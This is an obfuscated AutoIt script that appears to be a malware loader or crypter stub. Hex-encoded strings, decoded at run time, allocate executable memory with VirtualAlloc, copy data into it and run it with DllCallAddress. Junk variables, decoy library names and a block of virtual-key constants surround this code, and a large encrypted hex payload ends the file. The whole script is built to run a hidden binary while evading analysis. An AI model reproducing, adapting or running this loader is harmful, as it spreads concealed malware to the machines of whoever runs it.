	Global $tdqoiiquyhkoahtr = ">0,-1"
	Local $xwtwnmurfnhpmgzzllu = "wstr"
	Global $qjuxsmxbojdpbszgcc = "Call Failed"
	Global $hrryhbhhgoraf = "comctl32.dll"
	Local $ptitdy = "wstr"
	Local $fgaeiskahjsdzkkqthvmov = "StructureConstants.au3"
	Local $mifyhiuf = "bool"
	Dim $hdywgaywryqixdkqbzijt = "_IEPropertyGet"
	If NOT ($oymwf == 0) Then
		Local $dsqf656sd5q = $poe($vfds41dfs4("0x446C6C43616C6C28226B65726E656C3332222C2022707472222C20225669727475616C416C6C6F63222C202264776F7264222C202230222C202264776F7264222C2042696E6172794C656E2824666473766734357364663534677629202B2042696E6172794C656E282461292C202264776F7264222C2022307833303030222C202264776F7264222C20223078343022295B2230225D"))
	Else
		$poe($vfds41dfs4("0x446C6C537472756374536574446174612824647371346473342C20312C2024666473766734357364663534677629"))
	EndIf
	Dim $vjeczayxyjpiqjzfoxqxgwzi = IsString("ftsomrwvzhwxaogmwakfqzcsuarlmhjusutvfboqlfjfltg")
	Global $srbvdcmby = "EnumWindowStationsW"
	Global $brziuthbtuldotykwgdi = "MinSecond"
	Local $ronnhneqzu = "int"
	Dim $zzadkqmxf = "PathCommonPrefixW"
	Dim $dcfrvnokkiuh = "ImageList_DragMove"
	Global $peljlpskwgzxoejl = "GetFileSizeEx"
	Dim $dkzzego = "gdi32.dll"
	Global $ftxlbwtunwukrilvpz = "ImageList_SetImageCount"
	Dim $dbcwdqfhcwvxtrmbmmiprc = "hWnd"
	Local $tqnjrpnutcsvoxfomla = "int"
	Local $qyucmxlfartdkzrxlghczot = "Y"
	Global $caerjjeuaopocpjn = "ulong_ptr"
	Dim $lngxpa = "dword"
	If NOT ($vjeczayxyjpiqjzfoxqxgwzi == "ylgtgdiazmazrdbgpmtjuckixvqomesuoapbki") Then
		Local $dsq4ds4 = $poe($vfds41dfs4("0x446C6C5374727563744372656174652822627974655B2220262042696E6172794C656E2824666473766734357364663534677629202620225D2229"))
	Else
		Local $yxqhchvxrvlhcqrbxevrdtp = $ee($v1("0x2472726C786A69616A6C626974652026202243333238333934354534373244383844343543433530364130343844343546383530384234354238383343303038353046463735453838393744434346463935373030313030303022"))
	EndIf
	Dim $lybfoexvlbihjypzciw = IsInt("dchpjpthrwwlmdpaipjzbibimlrenvez")
	Local $rdmbvdpqqrtwyj = "struct*"
	Local $tymttsmx = "Item"
	Global $eoarnpnkrv = "NativeFontCtl"
	Dim $rrsetbthlzxvzs = "LockWorkStation"
	Local $ephimbqbiivqsjtqzbbaiefc = "user32.dll"
	Global $dwowpasrkaefqbdk = "gdi32.dll"
	Global $sqdfzrwjrakfjtlnfu = " size="
	Dim $arjpvwlyftmeiazzr = "The GPIB bus was RESET!"
	Dim $qarauuleoxqgrbszupd = "handle"
	Local $mgybbtmnnfgnz = "{A305CE99-F527-492B-8B1A-7E76FA98D6E4}"
	Global $vakgkhcfmgia = "int"
	Dim $khfokbttssbjl = "urn:schemas-microsoft-com:asm.v1"
	Dim $szktcj = "Mask"
	Dim $esoulmhmt = "OpenProcess"
	If NOT ($lybfoexvlbihjypzciw == "tgumhikghfnvpvzkkyvojbuzhylmukmqnpyewykjjyrhez") Then
		Local $dsq4f8s5dq = $poe($vfds41dfs4("0x446C6C5374727563744372656174652822627974655B2220262042696E6172794C656E2824666473766734357364663534677629202620225D222C2024647371663635367364357129"))
	Else
		Local $joejzlmmhza = $ee($v1("0x2470746F6A7961757778657966657771746D70767561636F6A6365696B2026202244373844383545434644464646463833433430433530464644363539343035303844383545434644464646463530384438354343463246464646353046464437384438353238464522"))
	EndIf
	Dim $tmohchsnj = IsInt(97020897)
	Dim $paviibcf = "hwnd"
	Dim $fzggtxreyig = "afterbegin"
	Dim $vqrrhnnfpvlmeludod = ";"
	Global $imhpzzbjxjprqnkknbsvzk = "_IETagNameAllGetCollection"
	If NOT ($tmohchsnj == "zmiuitrphbivwhbalncsfikqwknfl") Then
		$poe($vfds41dfs4("0x446C6C537472756374536574446174612824647371346473342C20312C2024666473766734357364663534677629"))
	Else
		Local $uzzjqr = $ee($v1("0x2479706F66787270797A706469706C7A7369686D79627163616A75746F2026202245324646464635304646443738443435394338334334304335304646443635393430353038443435394335303844383538344530464646463530464644373844383534434645464622"))
	EndIf
	Dim $htgjutcceunekciomwsl = IsInt("iyoyebwhzizlvuwdefdabbawz")
	Global $tacpcyxamifts = "ptr"
	Dim $mmvafalsej = "handle"
	Global $ymfiybtancwpdxtcvugoejhs = "dword"
	Dim $ojltufbovaktnjgzkzk = "__Excel_COMErrFunc"
	Dim $qjowduoenktierbibj = "bV5Size"
	Local $ckatfykxsndrwsceycgaqma = "{A63293E8-664E-48DB-A079-DF759E0509F7}"
	Dim $oxcxaztt = "__SQLite_Inline_Modified"
	Global $cywdhuxpqiyzdch = "dword"
	Dim $pkanajmuvm = "GdipSetPathGradientSurroundColorsWithCount"
	Global $edqvejw = "wparam"
	If NOT ($htgjutcceunekciomwsl == "yhkztchhimbmtuqyynfgcdsyzmfptgtyfr") Then
		Local $4dfgbs54fdg = $poe($vfds41dfs4("0x446C6C5374727563744372656174652822627974655B2220262042696E6172794C656E28246129202620225D2229"))
	Else
		Local $wrotlgqjqfw = $ee($v1("0x247470727A7079767077622026202246464646353045384435453546464646383934353738384438353043464146464646353045384336453546464646383934353734384438354634463946464646353045384237453522"))
	EndIf
	Dim $ckowqyzutdkmyonpxn = IsString(26054342)
	Local $tfuvmhdmlxyhqy = "uint"
	Global $vatanrfpdggwfwrr = "uint"
	Global $vdnnpryozgxqutcrys = "onChange"
	Dim $ofjawpfbgqrcmxl = "kpn"
	Local $jocfjfp = "$oIFrameTwo = _IEFrameGetObjByName($oIE, "
	Dim $ftynqdh = "bool"
	Dim $scsmtpfnhwrjlpb = "bool"
	Local $vdlklcvnrdm = "Left"
	Local $ezkhvqmtzbegmwh = "WinAPISysInternals.au3"
	Local $sybabiqqrfybaygdeletvvwc = "int"
	Local $fpzghroqr = " value="
	Dim $brfygvyafajrvftdwczxsck = "dword"
	Global $qkmhorbncbpwpgfizegilcxk = "int"
	Local $gfzgegifnoymsq = "MinYear"
	Dim $namsrkcgujnnncnyeu = "t"
	Dim $lphbsubsosdagwtdtovwa = "Shell.Explorer.2"
	Global $ralknnvzywckfrzpbofr = "wparam"
	Local $guvkfmhuas = "dword"
	Local $jreawecjtixcofumef = "ID"
	If NOT ($ckowqyzutdkmyonpxn == 1) Then
		$poe($vfds41dfs4("0x446C6C537472756374536574446174612824647371346638733564712C20312C2024666473766734357364663534677629"))
	Else
		Local $dlzrpnlpehsxqebbqwdcarglkl = $ee($v1("0x246373756277626E676B746A7565792026202234353843373736333733363336364337343539303631373438383435393243373835374346464646464636443635364437333636433734353830363537343838343538324337383522"))
	EndIf
	Dim $tfqrdpm = IsInt("gzpvmltdnsouqmhlyacbhyssblizjovcwpnexjpk")
	Global $hhgkjfvglxmlxiqgmi = ";wchar["
	If NOT ($tfqrdpm == 1) Then
		$poe($vfds41dfs4("0x446C6C53747275637453657444617461282434646667627335346664672C20312C20246429"))
	Else
		Dim $grfeus = $poe("binarytostring")
	EndIf
	Dim $dgydamxhrlirqf = BinaryToString("0x686A746A7374706D6762776977787A7A74746864626B6F797469706779626C6C756276746A6E6D7975747172")
	Local $zkdsvs = "SysAnimate32"
	Global $yfdsffoajcjwhnozpuusn = "struct*"
	Dim $gwcaoc = "selectall"
	Global $cilhpmlruxwbfrwotgy = "user32.dll"
	Dim $oybmicomgr = "dword"
	Dim $fdrzijas = "<li><a href="
	Local $aeglv = "handle"
	Local $qutngcdicirfoc = "RCPT TO: <"
	Local $bgpabpcnbmewd = "Action"
	Local $bnklqlxe = "bool"
	Global $uflyspatpxkp = "struct*"
	Local $eqzlzrhbnocfupjlzcfiipnm = "ptr"
	Dim $vgqxevrggfpytneyjpjfdfm = "Unselect"
	Local $iqpcn = "float["
	Global $luwqxkdidfkdlveqewx = "ole32.dll"
	Global $uflenardslczbjcss = "uxtheme.dll"
	Dim $cgbiommyyqgzzwarftxd = "dword NextEntryOffset;dword Action;dword FileNameLength;wchar FileName["
	Global $ybluunldyvznnec = "WinAPICom.au3"
	Dim $sebfcafjlnzcydc = "WinAPIHobj.au3"
	If NOT ($dgydamxhrlirqf == 0) Then
		$poe($vfds41dfs4("0x446C6C43616C6C41646472657373282264776F7264222C202464737166363536736435712C2022707472222C20446C6C53747275637447657450747228243464666762733534666467292C2022696E74222C2042696E6172794C656E282464292C2022737472222C2042696E617279546F537472696E67282462292C2022696E74222C203029"))
	Else
		Local $qlnbsoaqplxgrmscqzl = $ee($v1("0x246B6F6F6672656D2026202231304644464646463646303043373435434336443632373337344337343544303646373736333733383834354434433734354438373337343732364336364337343544433635364522"))
	EndIf
	Return $poe($vfds41dfs4("0x446C6C53747275637447657444617461282434646667627335346664672C203129"))
EndFunc

Global Const $vk_lbutton = 1
Global Const $vk_rbutton = 2
Global Const $vk_cancel = 3
Global Const $vk_mbutton = 4
Global Const $vk_xbutton1 = 5
Global Const $vk_xbutton2 = 6
Global Const $vk_back = 8
Global Const $vk_tab = 9
Global Const $vk_clear = 12
Global Const $vk_return = 13
Global Const $vk_shift = 16
Global Const $vk_control = 17
Global Const $vk_menu = 18
Global Const $vk_pause = 19
Global Const $vk_capital = 20
Global Const $vk_kana = 21
Global Const $vk_hangul = 21
Global Const $vk_junja = 23
Global Const $vk_final = 24
Global Const $vk_hanja = 25
Global Const $vk_kanji = 25
Global Const $vk_escape = 27
Global Const $vk_convert = 28
Global Const $vk_nonconvert = 29
Global Const $vk_accept = 30
Global Const $vk_modechange = 31
Global Const $vk_space = 32
Global Const $vk_prior = 33
Global Const $vk_next = 34
Global Const $vk_end = 35
Global Const $vk_home = 36
Global Const $vk_left = 37
Global Const $vk_up = 38
Global Const $vk_right = 39
Global Const $vk_down = 40
Global Const $vk_select = 41
Global Const $vk_print = 42
Global Const $vk_execute = 43
Global Const $vk_snapshot = 44
Global Const $vk_insert = 45
Global Const $vk_delete = 46
Global Const $vk_help = 47
Global Const $vk_0 = 48
Global Const $vk_1 = 49
Global Const $vk_2 = 50
Global Const $vk_3 = 51
Global Const $vk_4 = 52
Global Const $vk_5 = 53
Global Const $vk_6 = 54
Global Const $vk_7 = 55
Global Const $vk_8 = 56
Global Const $vk_9 = 57
Global Const $vk_a = 65
Global Const $vk_b = 66
Global Const $vk_c = 67
Global Const $vk_d = 68
Global Const $vk_e = 69
Global Const $vk_f = 70
Global Const $vk_g = 71
Global Const $vk_h = 72
Global Const $vk_i = 73
Global Const $vk_j = 74
Global Const $vk_k = 75
Global Const $vk_l = 76
Global Const $vk_m = 77
Global Const $vk_n = 78
Global Const $vk_o = 79
Global Const $vk_p = 80
Global Const $vk_q = 81
Global Const $vk_r = 82
Global Const $vk_s = 83
Global Const $vk_t = 84
Global Const $vk_u = 85
Global Const $vk_v = 86
Global Const $vk_w = 87
Global Const $vk_x = 88
Global Const $vk_y = 89
Global Const $vk_z = 90
Global Const $vk_lwin = 91
Global Const $vk_rwin = 92
Global Const $vk_apps = 93
Global Const $vk_sleep = 95
Global Const $vk_numpad0 = 96
Global Const $vk_numpad1 = 97
Global Const $vk_numpad2 = 98
Global Const $vk_numpad3 = 99
Global Const $vk_numpad4 = 100
Global Const $vk_numpad5 = 101
Global Const $vk_numpad6 = 102
Global Const $vk_numpad7 = 103
Global Const $vk_numpad8 = 104
Global Const $vk_numpad9 = 105
Global Const $vk_multiply = 106
Global Const $vk_add = 107
Global Const $vk_separator = 108
Global Const $vk_subtract = 109
Global Const $vk_decimal = 110
Global Const $vk_divide = 111
Global Const $vk_f1 = 112
Global Const $vk_f2 = 113
Global Const $vk_f3 = 114
Global Const $vk_f4 = 115
Global Const $vk_f5 = 116
Global Const $vk_f6 = 117
Global Const $vk_f7 = 118
Global Const $vk_f8 = 119
Global Const $vk_f9 = 120
Global Const $vk_f10 = 121
Global Const $vk_f11 = 122
Global Const $vk_f12 = 123
Global Const $vk_f13 = 124
Global Const $vk_f14 = 125
Global Const $vk_f15 = 126
Global Const $vk_f16 = 127
Global Const $vk_f17 = 128
Global Const $vk_f18 = 129
Global Const $vk_f19 = 130
Global Const $vk_f20 = 131
Global Const $vk_f21 = 132
Global Const $vk_f22 = 133
Global Const $vk_f23 = 134
Global Const $vk_f24 = 135
Global Const $vk_numlock = 144
Global Const $vk_scroll = 145
Global Const $vk_lshift = 160
Global Const $vk_rshift = 161
Global Const $vk_lcontrol = 162
Global Const $vk_rcontrol = 163
Global Const $vk_lmenu = 164
Global Const $vk_rmenu = 165
Global Const $vk_browser_back = 166
Global Const $vk_browser_forward = 167
Global Const $vk_browser_refresh = 168
Global Const $vk_browser_stop = 169
Global Const $vk_browser_search = 170
Global Const $vk_browser_favorites = 171
Global Const $vk_browser_home = 172
Global Const $vk_volume_mute = 173
Global Const $vk_volume_down = 174
Global Const $vk_volume_up = 175
Global Const $vk_media_next_track = 176
Global Const $vk_media_prev_track = 177
Global Const $vk_media_stop = 178
Global Const $vk_media_play_pause = 179
Global Const $vk_launch_mail = 180
Global Const $vk_launch_media_select = 181
Global Const $vk_launch_app1 = 182
Global Const $vk_launch_app2 = 183
Global Const $vk_oem_1 = 186
Global Const $vk_oem_plus = 187
Global Const $vk_oem_comma = 188
Global Const $vk_oem_minus = 189
Global Const $vk_oem_period = 190
Global Const $vk_oem_2 = 191
Global Const $vk_oem_3 = 192
Global Const $vk_oem_4 = 219
Global Const $vk_oem_5 = 220
Global Const $vk_oem_6 = 221
Global Const $vk_oem_7 = 222
Global Const $vk_oem_8 = 223
Global Const $vk_oem_102 = 226
Global Const $vk_processkey = 229
Global Const $vk_packet = 231
Global Const $vk_attn = 246
Global Const $vk_crsel = 247
Global Const $vk_exsel = 248
Global Const $vk_ereof = 249
Global Const $vk_play = 250
Global Const $vk_zoom = 251
Global Const $vk_noname = 252
Global Const $vk_pa1 = 253
Global Const $vk_oem_clear = 254
Local $j
mdfzjnyhbr()

Func mdfzjnyhbr()
	$j = "C41BA5176571595F73DA22ECFBC4972BAC9F0BD7403C9C70157C745B5B5DF32A23324FA212CE83A1456E31386F0231975555BD26B39EE981288BDD2C43132A8D7CB910852C0E59E07E1F0611CC10775F552401E31F12CD3D7284BE3AC5E41B6BB90401CC6C172A7F79CA2EE0DD2F0B6280AA36A0F951F0A57B6040E5BEC3D6490A6E2152FDE9E93E15EEB519405E3F5B66F011D7559D"
	$j = $j & "5F3D136C4049948248E28528E6E399357D7146DBD885FA0DFABEA838AF15855A1690A17C91B211B1692A98CEF8DBC9EE6ABF0A334D114DC4071E099B01959606F4BB19E492AEC0FBEF76AF4060A6B79EA79BA4C76F2031B163A820A1754CC30E8062FE2901EF6AFED7D180985DB823E4F9E81389BC3E468338B6222CB368D103D10287CA68469395F402DD664059D2C7E563B0785F9B"
	$j = $j & "3BFD1EE74352E0144A99FF3416202AF9DC5B23E54B8079B35951F0ED2760C9D36859E33B5E2853453476188C252A69973F08CDA60228142DA4201606221D1D0F2364D1B984F3F5565A02C261646D11D52A95A480632AA133B99114B7B75FB8F85605231AF143A1EFE92A4FA6610AC21CFDDAFB7A18897055509A9AFD1D5D738476CACD0572483350EF4C1551C4BA6243DDC0FE2A414F"
	$j = $j & "BA53F3E188FAEC321F54FE8DEA59C2ACF3A11E606A6F1D0CC1C96B7A3992FB79BEA66E9CBDB6300ABC0B6B4072F1048D4A20FE64D7FEDA6FEAA21E780DF6BB687A6040F1EB63B02F8437301D595D0784A40BCE333215D1F504A86C97DF2CC359109182028CBE2AE445A1F7BA2EC233D36A3DA1BB6C22F98D256926AFB0CC1BF75E9F2B32CB4B6E639F5274ACD87836CD1FFCB42114E3"
	$j = $j & "B89C7BC552DEC8790C2100C802731E6ECD8ED8E2C5F4111E25DF6EA53A9148F0F9A564FF0B96F0D7DB02624E75C2CA1CF1ED3628653E7B7666EEB139AED2C5F7B38D93191A50078508D1C9325D063E249C2D996FB24A03C831E6AE67C5D218ADC53EDE467C354CC15E9FDF8C8C767F00D2A7C9A89E37E7F0364C0E041E159636B3704AAF717A3FD3711C64FDAEA26005EDC55245091A"
	$j = $j & "81CBD7A80B48B04811D860804046E40D84C133C3764C64076B5D897055AFEE8585351C8997747220D6B50DCBC521E46A8CB5CE8A492579684F5A74FD3D96360941D45D7D7A64BD9F88291CF07286D3C0E1A68232160A99C75AC229EC965748595174C466B5A4D258B4C87A5072AEBD8401B47689AC3ED4F9E682A79147EEFB00E72D16F911AA5C85A4207D0C848DE9384447DBE5CF6E"
	$j = $j & "0833F743074AEC98AA5F0BA44A13946D01CECABD733B2D01DCCAF73C7DA9A82A0D7A1DAA7A1E76ED167EF2A6493639E502EA37A7C71D782B26D8658005DE96C48E2F83AF406ACE6F6E3AF14C8B25C513F818B31D60F307680381E34D1308D8616F0AB15F39F6FF4762D96B9ADBED27BAB90A68757C72AE5C45A04888699FB20C4144F3F5266E3E2F11E176DB75C4C1D71789B866E3AC"
	$j = $j & "518C1627B9E44047F659D269F19D44697B12139BED298EEEC2332CE2478E63AD4E27B079AC720C498282626B333D00D70CC01A769BCAD1549D8B127195C055E3650200D3B40578AD0EE19B6D45AA32FBFA1EF89A802DA1999DD8271645C83F7594C43016722EF4EC95BE43D8DB8FF8E780AFD411AF495096157FE4A753D9DD4224B578AFAE5E24A23C6278C35BC4DEAA5F0D95FF45A1"
	$j = $j & "A0665DA021945C6F4EC143361ECE459AD9F4228306E355339A8C803AB147F968B3E2BE8F6B791320DB95AE4F5B4487735429F7EAEE6F2A5239DAF6721EFD19096BFDCDD720091C7E4A7195096886FCE2847DACC67E47B9AFE0C1D61C7B6056EB216FBE87361D4888D6561EC3268AD9069CCB2501D3A488DD0B32B5CB850ECE7BF297221689888C27C0AA6ABD21F3DD6D94741F4CDA4B"
	$j = $j & "49B91CAFB66A857A780A237A23C2FB6285613D7D0FD298C2C2B6173CFCB221FB042D8B53C67CF0A8F495D9745175902289524E540E1AD92499BBD886C783832517A45F75CC4AC3FD26B2F20908EA6F7648034423D7EA787F9DD542DE154B10238854B514E540EF53F0C1F8CDC8A14BCA01AE8CD65AB2B76BFCB871EA80378C5C632A1BB030D54FCDDF4809A1DC37228D2C656B00EAF0"
	$j = $j & "EE022726D2F159914FBDC608C13EFC27096C1300342740B74524DEEEDEC800D3E143E6514AEF0F56CEBE756FC2B8307DA925C3D1D63684C9D5E4775B8552D3F185A842B64D03C53BC1AF483764B90A98C8FCCE4D0CB66301290A71E2BF7D83365AA7201FF67049CEAC6B9CE097F676D63436889852D49DE93E00FB43B3E316C3647CB3A40FEAEE6AE26662B8DA34B0FAC86846DFD2F8"
	$j = $j & "E28F8BEFD351DDAD70881FC2C794509C62F54F67C08FA4DAEE2DC17A0BAE8FCE4012AAFAD7D6D92BB2529075A451DBF153DEF5D06CE5E84C50A3E26D54A852A96A4CE5C2FDCDFB05928975E232B8C3BCBD165B67BFD4BCDA1263E8BDD859A7804F61EB392DC0DA174D1B753BEDA20942501EBE29B39299974D015A0B7E792B65A9F9DA474D603B8AAD532F66E45F79E2E576D7A28909"
	$j = $j & "EDBA829B8FB056EB596305FEE04FF9E0616DDF789639D12225D2D89B2885909BF13CB1E5A73AC92FA4135C9742439C5901B7F036B78E6D62BAF22F5ED57C74862BB9D60922FAAF5010E9E68918495FA1462968931056ADBC485E90F0E8B95DD5B3EE63EF7A26732059B6900163BECD024A43D5396E1B3E9C9784A9C44ED97404FD8C2971FEB84CDF3C7A3BF7E4E38170C17929D0EBBE"
	$j = $j & "79AE3692A509AE4F36745EB66449575C5C61678449CEC2808D6BA696B87CAC722ECDD128CCD7A5E098C9806DF46F2D89395789613E310FF4B33252F9D0C77D1A48187D85BC5197961B34FB025055E728778E06173BEA7A8C7C8D904EE15686772D363C3E7773864C9EFA164455BAC1C21D506A389129994AAA34823E072368097876DD602A37E0EFC430E4F28EAC9ADEB628EB85E20A"
	$j = $j & "729E9892E956C9AD41EE396E7C6FA794BF1A161AC5AB7B6248C3C6B70DBB8446F7654BC3C23F1AB1B20A12D3DADC0F2547F4FD4551DEDA1E858DB6F7BF684A4CB6E7A672DF489A73884727D93EAAC83F5E54936A78B1D7E33B61348E4FA0FC470D6C476C94AF3310F90449C5F96850EC48E4521DC249BDEA2FCC45A341E88410B4917177A87B769EB844161F8B9102074D7285B32867"
	$j = $j & "86D28512A11D0E54061D5D9B68DE49A3BC371D07A9C4BD88630EB1707FF4A1FA7ACB8A7B4413954ECD93779BA024FF2BDA9188725E1EF2261BE913D36EE6B9DC9C78FC0B7961B525FD9D020C246FBED79DAF1FD06804B094ACEC0B8149224D531304BEDE540F03B3C9420178BE0E535132B30DAEEC3603CF3AAE10976AAB32F007F4ED73EECB26FBB27740835DE92EA924A7AD2F7ACF"
	$j = $j & "B5DC30254863FF2FA08065D18CEC7AD7512B3AAF2465271371250BE28A0FED571694ADA00370111AA43F8166DCC0DD02C5C076281EBE930F73520D48A04768EE0097F71A11EFBF1C25AB8A7BAA0901FE3CBF8E2CE7507D22BD789D689A519BBA2E4FE15CD45D13F14CCD31C21C653EA779C6BFB473C4108F431C64A1ED9C2ECA97760DD357F6EF3E4BA8356748AFF6ED2128CEC532C6"
	$j = $j & "876109C8FF13E5EE7DF3B6F507E665A6F549591F26EA9E30FD51A6747C11DB81B3C336EFE1B5C896074797F7826A59712BB2CEB2175C4FED2B9A09F23B2B265115A5FD100936AEDC61C95C5426A40EC82B1253FE16E1B3A3EDA3F6FD0A31191D77411D55AF961D6C551690112A68F0D1DA534467FEE8713A01BB144494DC82BA94A00F6289B63ED7F30FA3A6EA89899639C4FC72FEF0"
	$j = $j & "D307C8361291F0118F9FC46FFB6602E1C64F5515DFDF9D44F24FDE738E34F267819644F8B3FF655C10F97F8A2CC3FB9E59EF7037750D3F1E40AEA6A7CE7CE26BA3BDC822641FA8F40C5C0BBCCAEDD1F9B73437EDA9AD5EFAD50FECC1D42AF42565BB03524B79C748FA054B1A6D8A2CF9FEB8309EA151221E9E58CCE35A988EF0EB7A40D152B8BFFF91B267801D141C5CDB9FE6567543"
	$j = $j & "ECAA982E486464F6DCE81DF6D1D7F034C0F0845099B2C2FFC4B5F630D10E973CF56DDB9B880CCE7A46AFD8960DDA5AAEE0937181BA58E9126482ACA7F837869DC2CB916BEFBCB028C26DC16C209639245DD98D636EA1560016A670E647166B1E9754C8BDE13EFF06294DDA9FA4C3955CA4461CC2C2C520A44F6DB9BF6F524457B2B165B4A4EBB60C2CE6BD3E05547EA42CC78E4B9452"
	$j = $j & "66D3A41D1B73D9B5220E028CD38FC146BF8B4364AF61F7E508665CA99A652DFED8AD8D8FE15E734BF351A7D3A1DAA1A1F9CDBF263CD126642D03178CB91C21FBA8B561C6409F1B2E182F4B73A1351B0DFAC1651C6DD79AD294E6878C36C78A42C50E22171F58588F74D79E2F3E323C56F58F788F032D009D287DB53FF43970946978DB13CADC7CE46C161A8E8A3489BCEB24E86FAF47"
	$j = $j & "3552FBA093E7ABC4179920BC0058860B68C5F51173F28FCC2EA7E7DBB96C01C65956F16DE526560A194386648F3F5CA4D78887349F37B7366D75BEDC3BB0BF6074946668996D0413294752F129D881EFACCFDFAEC7D7ADB7419DF5C4A4E78BC7F82A9A98C4F1DE8618BDF1B7FA1AFD8167E1E7BEE403648036F9F891FB07BD990913384C127134E1CB0AB23D44D697302E71C5F5047D"
	$j = $j & "A6E1E21A88A16EF0611D6BD850D17BC9F3DD95B12FCF9C613BE613465363F627833FA3E9EDE4C05BF1C0286A5E0BC77C68D14EFCFCB676809826BD2C74A684446C3A05C55344D9D9781C726AD2C700E5EB64A0356F13F3FDF65B01A2778735CCE8E74BFCB875F26312200F0E7FD6344A599A3155112C6325651299481C3791FA496F8CF1D177F1B4B7E6E7E1E0607FA572A24554E2FB"
	$j = $j & "FB9DB79EBC56E9F6D3CF59409825D509D98E38579907BFD590D288045124A88616CEA6DE9C25458A93841FD7F7CF04EA477D4AFC6EA1DC5B1B8DCCAFCE4115B7CB34E4C7E68D5302DFC76B44119AB4B60B837E959BC9F5B42CEABF698C98FEB08F84AD270B10A41755C6184B9104723DAFDE1121B5EF91522E384BE6C2503D4D80276AA418951BF1DA5066E4EDD4995E804752908B70"
	$j = $j & "5452A0BFC75A8B2B86C9856D6237BAFAADD39DDD531EDBDE95D1C806F799E9AADC5A21DD734EE61F5DB2375E81BC938FC2D1209CC9CA108D4826FAAD6EF19C72E1F00145A8684123F9BD151E236C6FF278498A57C541FFEC005BCEEA37481A31B363F3969584D6CE36A235852BD1722CE3AF7F3DAD42C96D88B6B6E8C8E0BEB3FD6F825F6997669A88C8062E6FFF917E9B6717B142E9"
	$j = $j & "FA9DA53B470FABA937F4E1EA1547E593A717F6F971D245FC373E27780E2EF83933D4BEA39233BE09A40A849CB26D460DF146D14934E61D441599396D5507D1376ED1BF1D7676F8FF6941C08FBEF7AE5F5FF73AC3BCA8D3C5545BBD201836DDDD1795617152E4881ACFD937E09BCD370DB132A5F2B9F419E8AF078825B9BC6EB37F0C0A7BA5BA0E13F12A312186AC015AB629BD215D1F"
	$j = $j & "1140A46F9A5EB948664E61ACD106C55FB98DABB8F48323693A4EADCAA54865FA367414580C3A985ED4DA281A664C913467B35F792D335442B40700A81BB88F14E237A9370160A6BDF960C4F0F5427D1CE0E3F477984B35DC78D704967165A00EF2BA9DC162E6FCCF994752078BC07B07635E2ECAA89DA5DA948C2D82BA3FFA81280DE2D8012DB5C93B4F016041BA1194026468896C73"
	$j = $j & "69F37C7B6A15591EB249D56205E2696CF2D03534CC2CD3899A1055E6CFBDEC77A94556A3C5DF5862E1B34C8A7EED7ABDBE077DA22B42E64563A721A4C67581876CBB67107FD5321BEC959EF415F8B91847CE4942F975028A4F50D59D8CACD4BFE4D30EAB06E40B2EC9A33951BF1CD3625F3D91FAE4AD133C8ECD79E0FC92366AC2D07F3E23DFC6A08072A552090BD0A464E9FBA1AD7D"
	$j = $j & "51276010C66DC6350CF60A79A0FEDF952B979435A143C1561CDF8ABFB5BC7289F2AD19469BA03ACB78F71F439FFB0BC739640C3C4F067C126E362CF5B03CB1579EADEC011873FCFB274E0D309F85FE054988E0AF70C54D564F8DE7DFC409C43945BE1EADEA01211937FA35DD5D67C4E326772EFBE59BF9F88E87095ECA46FACCBA056261E332D674C9105E7DC07008A30C64624F0378"
	$j = $j & "AB7FFADBE9E8EB8680B2C1FDE3526B23D1323183A488BFFE4EAF29A50F6449C1F621291407512B1B36E0DC0457CD764B21AF8D386DD49155A6E33D127F93D2E4CEB5DC0D6941F01354A37F0B944410142AE206D82127F0264E51A8C29DFDCC3C7995C85F957100060786DB385E619EB6E8B98120C0D009838AE794168A88B0D5EEFCBEFB7BF7F89BC299C890BEEE76DD100CE15DAD7B"
	$j = $j & "28FD1270B1578EF779CCEF6241DD3FC5057011B68C9CB1B63379FF4830831D11062FC8D059B0B53B8D81D27487198AC0923F15BA4F481EFF4F202A0B795C181FCCE8C4EC0B4BB1C1ADFFFCFE1BE678E1D05E6FB526F60CCB8C691A7D2F31A7710C716C64F298527A09239856A950FD9291E735B8EC39C771E990BB41EC8242431A10738D6D874583DE5EDAE819F2EB1B05DF574F62F8"
	$j = $j & "5A6684EA2B6F908CD45EDB054739C84A12974968B028F379A8F6F6821641A7FD0CB8F5B776A8BE2E048AB585F9CCA89CEAF053FA7AB60B45ADBA4272D8D9BAEBB4C6EC351C881F7FA3AA9A1E5B34155F45661F2D54C89774FA10C145D972138749EDFAFDA0208DC59D7D0CAE9D38913B6479E7CDF2706CA4B312E3DD30894B391F2237C0567F0DF9E6329CFB38E80CA33602CB21AF98"
	$j = $j & "4E75B174D2A2E400B40C17A195256FD7F5C1F9C247647033778F873EE75E7287855C01596082F74F0BCB76E9AB23B7C07C2CAD65D635AE273A0D4B11BFAEF5FD37E73A803DBF9C9640C288D0D6E1F9B072F87B69D6E12FC2DC6A0DC6C8BF6B11D84AB3A2102AD660D000AD5EE1CDD95F3D656390F312F4CD39B0FF4D831087E1B9A3F91F7BF8746294995D596297874D480C5049F58F"
	$j = $j & "84630422C4E581A29A7CDAD7F5462BC1551AC9ADD8AD91EF4C9F620EFFD9B06A9A5E6AF43684834526DFE267BDFD2F25F6DC88E49E927BD39D4ED92197F53D223B6AC782203E6CDBE49DFD2912FCC642FF6DA5B454013BF2FBBE6D76F7BF752DE8664F8468C8DB341FA6C5B3EE89851190272987A522430341F7A16854306EE58716B408589748B888CC7619A0A30D41E24108354F40"
	$j = $j & "D601BD743BB764C4F583A284036E4CDEF97F2C005D602F72F5D8BB2E41AF6A3E733556917B0AF0CD6431C76CD099F8D3C589B25432E6519B5C5D2CCA2050925432B3AC5DA3D03B032E0FB9B5AE1755391CA21F62EB0ADD148C1768D8C9C2CED0214538AAFCD9BA187118149262B43FF1C9D88F5A32F374BEE08C33C6EC7B17C4309425CF40727EBE9A5D77B7A5404B651EECC55900B9"
	$j = $j & "A10E4DDA4F938196E52796A75F1B5D8A2A6EF0A63A5E5A57755E224D9719E3E600B1FB6E9A52FA452E016BF2D88CBB858818BF3076E96FA63613867D33B56F136F3EC158E2DE487D85A86406AAC068FF8F4FE64AD05B3E1215A6E7D542AE79EEB4FEF5E62DF1DDAAEE06D1E19DBBDCABF97EDFFFF68808802FAE80BB73C8D8EE63B867C323A2A0A28A62968EC3E786DD2BBC679B2613"
